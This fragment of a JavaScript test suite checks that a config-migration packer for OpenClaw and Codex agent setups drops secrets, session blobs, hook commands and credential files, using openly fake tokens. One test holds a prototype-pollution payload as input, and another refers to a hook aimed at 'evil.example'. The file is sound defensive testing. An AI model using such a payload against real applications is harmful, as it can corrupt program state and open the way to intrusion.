    assert.equal(EXCLUDE_NAME_RE.test(safe), false, `${safe} must not be over-matched`);
  }
  for (const roleNamedSource of [
    "authentication-guide.md", "session-manager.js", "oauth-guide.md", "credential-helper.md",
  ]) {
    assert.equal(
      EXCLUDE_NAME_RE.test(roleNamedSource),
      true,
      `${roleNamedSource} is classified by role; pack.mjs must preserve it by safe leaf type`,
    );
  }
});

// ---- OpenClaw config migration (CONT-05) --------------------------------------

test("packOpenclawConfig DROPS WhatsApp session material the leaf redactor leaks", () => {
  const report = { redactedSecrets: [], mcp: [] };
  const cfg = openclawConfigSample();
  const out = packOpenclawConfig(cfg, { translated: 0, nonHome: [] }, [], "/data/home/agent", report);
  const s = JSON.stringify(out);
  // The whole session subtree is GONE (allowlist never lists it), not merely redacted.
  assert.equal("session" in out, false, "top-level session subtree must be dropped");
  assert.equal(s.includes("linked-device-cookie-blob"), false, "session cookie must not survive");
  assert.equal(s.includes("d2hhdHNhcHBTZXNzaW9uQmxvYg=="), false, "whatsapp session blob must not survive");
  assert.equal(s.includes("+15551234567"), false, "linkedNumber must not survive");
  // Per-channel: only enabled+type survive; the bot token is DROPPED by the allowlist.
  assert.equal(out.channels.whatsapp.enabled, true);
  assert.equal("session" in out.channels.whatsapp, false);
  assert.equal("linkedNumber" in out.channels.whatsapp, false);
  assert.equal(s.includes("987654321:AAFakeTelegramBotTokenForTestingNotReal"), false, "botToken must not survive");
  assert.equal("botToken" in out.channels.telegram, false);
  // Every drop is recorded so the migration is auditable, never silent.
  assert.ok(report.openclawDropped.some((p) => p.startsWith("session")), "session drop recorded");
  assert.ok(report.openclawDropped.includes("channels.whatsapp.session"), "channel session drop recorded");
});

test("packOpenclawConfig PRESERVES the structure the box needs to reconnect channels", () => {
  const report = { redactedSecrets: [], mcp: [] };
  const out = packOpenclawConfig(openclawConfigSample(), { translated: 0, nonHome: [] }, [], "/data/home/agent", report);
  assert.equal(out.version, 2);
  assert.equal(out.channels.telegram.enabled, true);
  assert.equal(out.channels.telegram.type, "telegram");
  assert.deepEqual(out.bindings, [{ agent: "assistant", channel: "telegram" }]);
  assert.equal(out.agents.entries[0].name, "assistant");
  assert.equal(out.agents.entries[0].model, "gemini-1.5");
  assert.equal(out.gateway.bind, "loopback");
  assert.equal(out.gateway.port, 8787);
  assert.equal(out.ui.theme, "dark");
});

test("packOpenclawConfig DROPS unlisted subtrees (gateway.auth, agents.systemPrompt, hooks) fail-closed", () => {
  const report = { redactedSecrets: [], mcp: [] };
  const out = packOpenclawConfig(openclawConfigSample(), { translated: 0, nonHome: [] }, [], "/data/home/agent", report);
  const s = JSON.stringify(out);
  assert.equal("auth" in out.gateway, false, "gateway.auth (token holder) must be dropped");
  assert.equal(s.includes("gw-secret-token-value-1234"), false, "gateway token must not survive");
  assert.equal("systemPrompt" in out.agents.entries[0], false, "agent systemPrompt dropped until evidence says keep");
  assert.equal(s.includes("SECRET-PROMPT"), false);
  assert.equal("hooks" in out, false, "hooks subtree (arbitrary commands) must be dropped");
  assert.equal(s.includes("evil.example"), false, "no hook command survives");
});

// 2026-07-23: closes the allowlist-completeness gap CONT-05-RUNTIME-PLAN flagged --
// Telegram/Discord access-control fields (who may message the bot) are non-secret
// structure a real reconnect needs, grounded in OpenClaw's own configuration-examples.md.
test("packOpenclawConfig PRESERVES Telegram access-control fields (non-secret, needed to reconnect)", () => {
  const report = { redactedSecrets: [], mcp: [] };
  const cfg = {
    channels: {
      telegram: {
        enabled: true, type: "telegram", botToken: "111:FAKE",
        allowFrom: ["111111", "222222"],
        groupPolicy: "allowlist",
        groupAllowFrom: ["-100333333"],
        groups: { "-100333333": { requireMention: true } },
      },
    },
  };
  const out = packOpenclawConfig(cfg, { translated: 0, nonHome: [] }, [], "/data/home/agent", report);
  assert.deepEqual(out.channels.telegram.allowFrom, ["111111", "222222"]);
  assert.equal(out.channels.telegram.groupPolicy, "allowlist");
  assert.deepEqual(out.channels.telegram.groupAllowFrom, ["-100333333"]);
  assert.equal(out.channels.telegram.groups["-100333333"].requireMention, true);
  assert.equal("botToken" in out.channels.telegram, false, "credential still drops even alongside the new fields");
});

test("packOpenclawConfig PRESERVES Discord access-control fields, including nested guild/channel policy", () => {
  const report = { redactedSecrets: [], mcp: [] };
  const cfg = {
    channels: {
      discord: {
        enabled: true, type: "discord", botToken: "discord-fake-token",
        dmPolicy: "owner-only",
        allowFrom: ["444444444444444444"],
        guilds: {
          "555555555555555555": {
            slug: "hq", requireMention: false,
            channels: { general: { enabled: true, requireMention: true } },
          },
        },
      },
    },
  };
  const out = packOpenclawConfig(cfg, { translated: 0, nonHome: [] }, [], "/data/home/agent", report);
  assert.equal(out.channels.discord.dmPolicy, "owner-only");
  assert.deepEqual(out.channels.discord.allowFrom, ["444444444444444444"]);
  const guild = out.channels.discord.guilds["555555555555555555"];
  assert.equal(guild.slug, "hq");
  assert.equal(guild.requireMention, false);
  assert.equal(guild.channels.general.enabled, true);
  assert.equal(guild.channels.general.requireMention, true);
  assert.equal("botToken" in out.channels.discord, false);
});

test("packOpenclawConfig DROPS an unsupported channel name entirely, fail-closed (no bare enabled/type shell)", () => {
  const report = { redactedSecrets: [], mcp: [] };
  const cfg = { channels: { telegram: { enabled: true, type: "telegram" }, signal: { enabled: true, type: "signal", token: "sig-secret" } } };
  const out = packOpenclawConfig(cfg, { translated: 0, nonHome: [] }, [], "/data/home/agent", report);
  assert.equal("signal" in out.channels, false, "a channel type outside telegram/discord/whatsapp must not survive at all");
  assert.ok(report.openclawDropped.includes("channels.signal"), "the drop is recorded, not silent");
  assert.equal(out.channels.telegram.enabled, true, "the supported sibling channel is unaffected");
});

test("packOpenclawConfig keeps WhatsApp minimal (enabled/type only) even when the real config carries more", () => {
  const report = { redactedSecrets: [], mcp: [] };
  const cfg = {
    channels: {
      whatsapp: {
        enabled: true, type: "whatsapp",
        allowFrom: ["+15551234567"], // phone-number PII -- deliberately NOT migrated
        groups: { "abc@g.us": { requireMention: true } },
      },
    },
  };
  const out = packOpenclawConfig(cfg, { translated: 0, nonHome: [] }, [], "/data/home/agent", report);
  assert.deepEqual(Object.keys(out.channels.whatsapp).sort(), ["enabled", "type"]);
  assert.ok(report.openclawDropped.includes("channels.whatsapp.allowFrom"), "phone-number allowlist drop recorded");
  assert.ok(report.openclawDropped.includes("channels.whatsapp.groups"), "whatsapp groups drop recorded");
});

test("applyAllowlist drops a NEW unknown top-level key (future OpenClaw secret cannot leak)", () => {
  const report = { openclawDropped: [] };
  const out = applyAllowlist(
    { version: 1, futureSecretCache: { apiKey: "x" }, channels: { telegram: { enabled: true } } },
    OPENCLAW_MIGRATE_SPEC, "", report,
  );
  assert.equal("futureSecretCache" in out, false, "an unlisted key is dropped by default");
  assert.ok(report.openclawDropped.includes("futureSecretCache"), "the drop is recorded");
  assert.equal(out.version, 1);
  assert.equal(out.channels.telegram.enabled, true);
});

test("packOpenclawConfig does not mutate its input", () => {
  const report = { redactedSecrets: [], mcp: [] };
  const cfg = openclawConfigSample();
  packOpenclawConfig(cfg, { translated: 0, nonHome: [] }, [], "/data/home/agent", report);
  assert.equal(cfg.session.cookie, "linked-device-cookie-blob", "input session survives untouched");
  assert.equal(cfg.channels.telegram.botToken, "987654321:AAFakeTelegramBotTokenForTestingNotReal");
});

test("ui is an explicit key map, NOT a wholesale keep: a non-shaped blob under ui is DROPPED", () => {
  // Red-team 2026-07-23: `ui: true` used to keep the whole ui subtree, so a base64 session
  // blob under an unlisted ui key (matching no secret regex/shape) rode through the 2nd net.
  const report = { redactedSecrets: [], mcp: [] };
  const cfg = { ui: {
    theme: "dark",
    waSession: "d2hhdHNhcHBTZXNzaW9uQmxvYg==",     // non-key-named, non-shaped -> the hole
    recentChats: ["the deploy plan for tuesday"],   // free-form -> must not ride along
  } };
  const out = packOpenclawConfig(cfg, { translated: 0, nonHome: [] }, [], "/data/home/agent", report);
  assert.equal(out.ui.theme, "dark", "known-safe leaf kept");
  assert.equal("waSession" in out.ui, false, "unlisted ui key dropped");
  assert.equal("recentChats" in out.ui, false, "unlisted ui key dropped");
  assert.equal(JSON.stringify(out).includes("d2hhdHNhcHBTZXNzaW9uQmxvYg=="), false, "the blob does not survive");
  assert.ok(report.openclawDropped.includes("ui.waSession"), "the drop is recorded");
});

test("applyAllowlist drops prototype-chain input keys cleanly (no inherited-member resolve, no pollution)", () => {
  const report = { openclawDropped: [] };
  const evil = JSON.parse('{"version":1,"__proto__":{"polluted":true},"constructor":{"x":1},"gateway":{"toString":"nope","bind":"loopback"}}');
  const out = applyAllowlist(evil, OPENCLAW_MIGRATE_SPEC, "", report);
  assert.equal(({}).polluted, undefined, "no global prototype pollution");
  assert.equal(out.version, 1);
  assert.equal(out.gateway.bind, "loopback");
  assert.equal(Object.prototype.hasOwnProperty.call(out.gateway, "toString"), false, "inherited-name key under gateway dropped, not kept as own");
  assert.notEqual(out.gateway.toString, "nope", "the bogus toString value did not survive");
  assert.ok(report.openclawDropped.includes("gateway.toString"), "the drop is recorded, not silent");
});

// ---- Codex (~/.codex) migration: redaction + exclusion -----------------------

test("matchesCodexExclude: auth, config, session, history, and runtime state never migrate", () => {
  for (const n of ["auth.json", "config.toml", "history.jsonl", "sessions", "log", "logs", "cache",
                    "codex.credentials.bak", "foo.lock"]) {
    assert.equal(matchesCodexExclude(n), true, `${n} must be excluded`);
  }
  for (const n of ["AGENTS.md", "prompts", "my-prompt.md"]) {
    assert.equal(matchesCodexExclude(n), false, `${n} must be migratable`);
  }
});

test("applyAllowlist: `true` over an unexpected object/array drops fail-closed (no wholesale keep)", () => {
  const rep = { openclawDropped: [] };
  const cfg = { version: 1, channels: { telegram: { enabled: true, type: "telegram",
    allowFrom: [ { note: "opaque-in-allowfrom-999" }, "123456" ] } } };
  const out = packOpenclawConfig(cfg, { translated: 0, nonHome: [] }, [], "/data/home/agent", rep);
  assert.equal(JSON.stringify(out).includes("opaque-in-allowfrom-999"), false, "object element dropped");
  assert.ok(out.channels.telegram.allowFrom.includes("123456"), "scalar id kept");
});
